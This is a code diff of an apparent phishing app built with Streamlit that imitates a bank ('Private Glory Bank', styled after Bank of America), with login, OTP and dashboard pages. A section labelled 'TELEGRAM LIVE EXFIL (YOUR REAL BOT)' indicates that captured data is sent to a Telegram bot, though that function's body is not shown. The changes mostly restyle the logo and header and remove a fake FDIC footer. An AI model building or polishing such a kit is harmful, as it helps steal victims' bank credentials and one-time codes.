@@ -6,8 +6,7 @@ import requests
 import random
 import base64
 
-# ==================== NEW BANK LOGO (BANK OF AMERICA STYLE) ====================
-
+# ==================== BANK OF AMERICA-INSPIRED LOGO WITH BANK NAME ====================
 svg_logo = '''
 <svg width="240" height="80" viewBox="0 0 240 80" xmlns="http://www.w3.org/2000/svg">
   <rect x="20" y="18" width="200" height="10" rx="5" fill="#e7001f"/>
@@ -16,9 +15,8 @@ svg_logo = '''
   <text x="120" y="75" text-anchor="middle" font-size="22" font-family="Helvetica Neue, Helvetica, Arial, sans-serif" fill="#0e2a47" font-weight="bold">PRIVATE GLORY BANK</text>
 </svg>
 '''
-boa_logo_b64 = base64.b64encode(svg_logo.encode()).decode()
+boa_logo_b64 = base64.b64encode(svg_logo.encode("utf-8")).decode()
 BANK_LOGO = f'data:image/svg+xml;base64,{boa_logo_b64}'
-FDIC = "https://i.ibb.co/0jF3Y7Q/fdic-ssl.png"
 
 # ==================== TELEGRAM LIVE EXFIL (YOUR REAL BOT) ====================
 def tg(message):
@@ -81,10 +79,14 @@ if "tx" not in state:
 
 st.set_page_config(page_title="Private Glory Bank", page_icon="🏦", layout="wide")
 
-# ==================== NEW, MODERN BANK STYLES ====================
+# ==================== MODERN BANK STYLES (NO FOOTER) ====================
 st.markdown(f"""
 <style>
-    .stApp {{background: #eef2f6; color: #1a1a1a; font-family: 'Helvetica Neue', Arial, sans-serif;}}
+    .stApp {{
+        background: #eef2f6;
+        color: #1a1a1a;
+        font-family: 'Helvetica Neue', Arial, sans-serif;
+    }}
     .header {{
         background: linear-gradient(135deg, #e7001f 0%, #2253a7 100%);
         padding: 2rem 0 1.5rem 0;
@@ -128,24 +130,7 @@ st.markdown(f"""
         color: #fff;
         transform: translateY(-2px);
     }}
-    .footer {{
-        position: fixed;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        background: #2253a7;
-        color: #fff;
-        text-align: center;
-        padding: 20px 0 10px 0;
-        font-size: 0.97rem;
-        z-index: 9999;
-        box-shadow: 0 -5px 16px rgba(34,83,167,0.09);
-    }}
 </style>
-<div class="footer">
-    <img src="{FDIC}" width="260">
-    <br>Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank
-</div>
 """, unsafe_allow_html=True)
 
 # ==================== HEADER W/ LOGO ====================
@@ -153,9 +138,11 @@ def header():
     st.markdown(f"""
     <div class="header">
         <img src="{BANK_LOGO}" class="logo-img" width="225">
-        <h1 style="color:white;font-size:2.8rem;font-weight:300;margin:18px 0 0 0;">PRIVATE GLORY BANK</h1>
-        <p style="color:#fff;font-size:1.15rem;margin-top:5px;">Secure • Modern • American Banking</p>
     </div>
+    """, unsafe_allow_html=True)
+    st.markdown("""
+        <h1 style="color:white;text-align:center;font-size:2.2rem;font-weight:300;margin:15px 0 0 0;">PRIVATE GLORY BANK</h1>
+        <p style="color:#fff;text-align:center;font-size:1.15rem;margin-top:4px;">Secure • Modern • American Banking</p>
     """, unsafe_allow_html=True)
 
 # ==================== LOGIN ====================
@@ -200,7 +187,6 @@ def otp():
 def dashboard():
     header()
     st.markdown("<p style='text-align:right;color:#525252;font-size:1.08rem;margin-top:-45px'>Welcome back, Awesome12@</p>", unsafe_allow_html=True)
-
     c1,c2,c3,c4 = st.columns(4)
     with c1: st.markdown(f"<div class='card'><p class='balance-label'>Checking ••••1776</p><p class='balance-amount'>${state.checking:,.2f}</p></div>", unsafe_allow_html=True)
     with c2: st.markdown(f"<div class='card'><p class='balance-label'>Savings ••••1812</p><p class='balance-amount'>${state.savings:,.2f}</p></div>", unsafe_allow_html=True)
